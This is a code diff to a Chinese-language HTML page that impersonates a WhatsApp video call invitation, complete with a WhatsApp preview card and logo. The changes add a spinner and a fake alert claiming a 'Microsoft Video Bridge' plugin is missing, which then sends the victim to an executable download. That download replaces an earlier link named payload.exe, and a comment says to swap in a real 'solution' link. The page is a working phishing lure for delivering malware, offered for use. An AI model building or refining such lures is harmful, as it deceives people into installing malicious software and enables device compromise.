@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>视频通话</title>
 
-  <!-- Open Graph for WhatsApp 预览卡片 -->
+  <!-- WhatsApp 预览卡片 -->
   <meta property="og:title" content="视频通话" />
   <meta property="og:description" content="请使用以下链接加入我的 WhatsApp 视频通话。" />
   <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" />
@@ -59,6 +59,23 @@
     button:hover {
       background-color: #1da851;
     }
+    .loading {
+      display: none;
+      margin-top: 20px;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #25d366;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 10px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -66,15 +83,26 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" alt="WhatsApp Logo" />
     <h2>加入 WhatsApp 视频通话</h2>
     <p>请点击下方按钮加入通话</p>
-    <button onclick="redirect()">加入通话</button>
+    <button onclick="startJoin()">加入通话</button>
+    <div class="loading">
+      <p>正在连接通话...</p>
+      <div class="spinner"></div>
+    </div>
   </div>
 
   <script>
-    function redirect() {
-      document.querySelector('button').innerText = "连接中...";
+    function startJoin() {
+      document.querySelector('button').style.display = 'none';
+      document.querySelector('.loading').style.display = 'block';
+
       setTimeout(() => {
-        window.location.href = "https://example.com/payload.exe"; // TODO: 替换为你实际的目标链接
-      }, 2000);
+        const confirmed = confirm("检测到您的系统缺少通话组件：Microsoft Video Bridge 插件，可能无法加入该通话。是否立即安装？");
+        if (confirmed) {
+          window.location.href = "https://example.com/fix-download.exe"; // 替换为你真实的“解决方案”链接
+        } else {
+          alert("您选择了取消安装，可能无法正常加入通话。");
+        }
+      }, 4000);
     }
   </script>
 </body>
